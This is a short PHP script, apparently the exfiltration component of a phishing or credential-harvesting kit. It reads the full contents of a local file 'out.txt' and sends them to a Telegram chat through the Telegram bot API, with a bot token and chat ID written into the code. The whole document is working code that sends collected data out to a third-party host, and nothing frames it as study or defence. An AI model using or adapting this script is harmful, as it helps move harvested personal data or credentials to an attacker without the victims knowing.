<?php
    sleep(2);
    $msg = urlencode(file_get_contents("out.txt"));
    file_get_contents("https://api.telegram.org/bot7659552435:AAGyCI4qRxkEUebwL3N6MWvtAcm6UGnQAGA/sendMessage?chat_id=7366446181&text=$msg");
?>
